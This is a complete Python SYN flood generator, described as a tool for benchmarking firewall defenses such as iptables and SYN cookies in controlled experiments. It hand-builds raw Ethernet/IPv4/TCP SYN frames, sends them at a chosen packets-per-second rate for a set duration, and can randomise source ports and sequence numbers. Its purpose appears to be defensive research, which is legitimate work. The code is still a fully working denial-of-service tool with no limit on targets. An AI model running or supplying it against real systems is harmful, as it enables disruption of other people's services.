#!/usr/bin/env python3
"""
Standardized TCP SYN flood injector for firewall comparison experiments.

Uses a raw AF_PACKET socket to construct Ethernet + IPv4 + TCP SYN frames.

Example:
    sudo python3 syn_injector.py \
        --iface eno1 \
        --src-ip 10.0.0.10 \
        --dst-ip 10.0.0.20 \
        --dst-port 80 \
        --rate 100000 \
        --duration 30

The generator intentionally keeps the traffic model simple and reproducible.
Defense-specific tests (EWMA decay, gossip, etc.) do not belong here.
"""

import argparse
import random
import socket
import struct
import time


ETH_P_IP = 0x0800
IPPROTO_TCP = 6


def checksum(data: bytes) -> int:
    """Internet checksum."""
    if len(data) & 1:
        data += b"\x00"

    total = 0
    for i in range(0, len(data), 2):
        total += (data[i] << 8) + data[i + 1]
        total = (total & 0xffff) + (total >> 16)

    return (~total) & 0xffff


def mac_bytes(mac: str) -> bytes:
    return bytes.fromhex(mac.replace(":", ""))


def ip_bytes(ip: str) -> bytes:
    return socket.inet_aton(ip)


def build_tcp_syn(src_ip, dst_ip, src_port, dst_port, seq):
    """Build a valid IPv4/TCP SYN packet."""

    src = ip_bytes(src_ip)
    dst = ip_bytes(dst_ip)

    # -------------------------
    # TCP header
    # -------------------------
    tcp = struct.pack(
        "!HHIIHHHH",
        src_port,
        dst_port,
        seq,
        0,                  # ACK number
        (5 << 12) | 0x002, # data offset=5, SYN flag
        65535,              # window
        0,                  # checksum placeholder
        0,                  # urgent pointer
    )

    # TCP pseudo-header
    pseudo = struct.pack(
        "!4s4sBBH",
        src,
        dst,
        0,
        IPPROTO_TCP,
        len(tcp),
    )

    tcp_checksum = checksum(pseudo + tcp)

    # Insert TCP checksum
    tcp = struct.pack(
        "!HHIIHHHH",
        src_port,
        dst_port,
        seq,
        0,
        (5 << 12) | 0x002,
        65535,
        tcp_checksum,
        0,
    )

    # -------------------------
    # IPv4 header
    # -------------------------

    total_length = 20 + len(tcp)

    # Generate IP ID ONCE
    ip_id = random.randint(0, 65535)

    # First construct header with checksum = 0
    ip = struct.pack(
        "!BBHHHBBH4s4s",
        0x45,               # IPv4, IHL=5
        0,                  # DSCP/ECN
        total_length,
        ip_id,
        0,                  # Don't fragment
        64,                 # TTL
        IPPROTO_TCP,
        0,                  # checksum placeholder
        src,
        dst,
    )

    ip_checksum = checksum(ip)

    # Construct FINAL header using SAME ip_id
    ip = struct.pack(
        "!BBHHHBBH4s4s",
        0x45,
        0,
        total_length,
        ip_id,              # same ID used during checksum
        0,
        64,
        IPPROTO_TCP,
        ip_checksum,
        src,
        dst,
    )

    return ip + tcp


def parse_args():
    parser = argparse.ArgumentParser(
        description="Controlled TCP SYN flood generator"
    )

    parser.add_argument("--iface", required=True,
                        help="Outgoing Ethernet interface")
    parser.add_argument("--src-ip", required=True,
                        help="Source IPv4 address")
    parser.add_argument("--dst-ip", required=True,
                        help="Destination IPv4 address")
    parser.add_argument("--dst-port", type=int, default=80,
                        help="Destination TCP port (default: 80)")
    parser.add_argument("--src-port", type=int, default=31337,
                        help="Source TCP port (default: 31337)")
    parser.add_argument("--dst-mac", required=True,
                        help="Destination MAC address")
    parser.add_argument("--src-mac", required=True,
                        help="Source MAC address")
    parser.add_argument("--rate", type=float, required=True,
                        help="Target SYN rate in packets/sec")
    parser.add_argument("--duration", type=float, required=True,
                        help="Attack duration in seconds")
    parser.add_argument("--random-src-port", action="store_true",
                        help="Randomize TCP source port for every SYN")
    parser.add_argument("--random-seq", action="store_true",
                        help="Randomize TCP initial sequence number")
    parser.add_argument("--defense", required=True,
                    choices=["baseline", "iptables", "syncookies", "adaptive"],
                    help="Defense mechanism used in this experiment")
    parser.add_argument("--experiment", required=True,
                    help="Experiment identifier, e.g. adaptive_1000pps")
    parser.add_argument("--verbose", action="store_true",
                        help="Print progress information")

    args = parser.parse_args()

    if args.rate <= 0:
        parser.error("--rate must be greater than 0")
    if args.duration <= 0:
        parser.error("--duration must be greater than 0")
    if not 1 <= args.dst_port <= 65535:
        parser.error("--dst-port must be 1..65535")
    if not 1 <= args.src_port <= 65535:
        parser.error("--src-port must be 1..65535")

    return args


def main():
    args = parse_args()

    src_mac = mac_bytes(args.src_mac)
    dst_mac = mac_bytes(args.dst_mac)

    eth = struct.pack("!6s6sH", dst_mac, src_mac, ETH_P_IP)

    sock = socket.socket(
        socket.AF_PACKET,
        socket.SOCK_RAW,
        socket.htons(ETH_P_IP),
    )
    sock.bind((args.iface, 0))

    interval = 1.0 / args.rate
    end_time = time.monotonic() + args.duration
    next_send = time.monotonic()

    sent = 0
    start = time.monotonic()

    try:
        while True:
            now = time.monotonic()
            if now >= end_time:
                break

            if now < next_send:
                time.sleep(next_send - now)

            if time.monotonic() >= end_time:
                break

            src_port = (
                random.randint(1024, 65535)
                if args.random_src_port
                else args.src_port
            )

            seq = (
                random.randint(0, 0xffffffff)
                if args.random_seq
                else (sent & 0xffffffff)
            )

            ip_tcp = build_tcp_syn(
                args.src_ip,
                args.dst_ip,
                src_port,
                args.dst_port,
                seq,
            )

            sock.send(eth + ip_tcp)
            sent += 1
            next_send += interval

            # If packet construction/transmission falls behind, resynchronize
            # rather than attempting an unbounded burst.
            if next_send < time.monotonic() - interval:
                next_send = time.monotonic()

            if args.verbose and sent % max(1, int(args.rate)) == 0:
                elapsed = time.monotonic() - start
                actual = sent / elapsed if elapsed else 0
                print(
                    f"sent={sent:,} elapsed={elapsed:.2f}s "
                    f"actual_rate={actual:,.0f} pps",
                    flush=True,
                )

    except KeyboardInterrupt:
        print("\nInterrupted by user.")

    finally:
        elapsed = time.monotonic() - start
        actual_rate = sent / elapsed if elapsed else 0

        print("\n=== SYN Injector Experiment ===")
        print(f"Defense        : {args.defense}")
        print(f"Experiment     : {args.experiment}")
        print(f"Requested rate : {args.rate:,.0f} pps")
        print(f"Duration       : {elapsed:.3f} s")
        print(f"Packets sent   : {sent:,}")
        print(f"Actual rate    : {actual_rate:,.0f} pps")


if __name__ == "__main__":
    main()